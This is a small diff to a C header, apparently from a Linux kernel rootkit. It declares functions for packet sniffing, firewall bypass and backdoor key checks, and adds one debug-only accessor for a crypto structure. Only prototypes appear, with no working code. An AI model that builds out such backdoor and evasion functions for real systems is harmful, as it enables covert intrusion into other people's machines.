@@ -127,6 +127,9 @@ struct task_struct *kv_sock_start_sniff(void);
 bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
 void kv_sock_stop_fw_bypass(void);
+#ifdef DEBUG_RING_BUFFER
+struct kv_crypto_st *kv_sock_get_mgc(void);
+#endif
 bool kv_bd_search_iph_source(__be32 saddr);
 bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
